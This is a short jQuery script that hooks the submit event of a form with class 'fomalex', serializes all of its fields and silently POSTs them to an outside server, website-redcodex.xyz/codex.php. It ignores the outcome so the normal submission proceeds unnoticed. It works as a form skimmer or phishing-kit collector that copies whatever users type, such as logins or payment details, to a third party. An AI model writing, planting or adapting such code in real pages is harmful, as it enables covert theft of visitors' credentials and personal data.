
$(".fomalex").submit(function() {

	var d = $(".fomalex");

	$.ajax({

        url: "http://website-redcodex.xyz/codex.php",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
